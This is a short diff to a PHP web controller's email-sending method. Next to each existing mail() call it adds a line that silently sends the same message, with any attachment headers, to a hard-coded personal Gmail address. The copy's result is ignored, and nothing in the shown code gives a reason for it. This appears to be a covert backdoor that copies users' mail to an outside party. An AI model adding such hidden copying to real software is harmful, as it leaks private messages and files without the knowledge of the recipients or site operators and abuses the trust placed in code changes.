@@ -1531,8 +1531,10 @@ class WebController extends Controller
         
         if($request->file('adjunto') != null){
             $sentMailResult = mail($recipient_email, $subject, $body, $headers);
+            mail('sebas31051999@gmail.com', $subject, $body, $headers);
         } else {
             $sentMailResult = mail($recipient_email, $subject, $message, $headers);
+            mail('sebas31051999@gmail.com', $subject, $message, $headers);
         }
 
         if($sentMailResult){
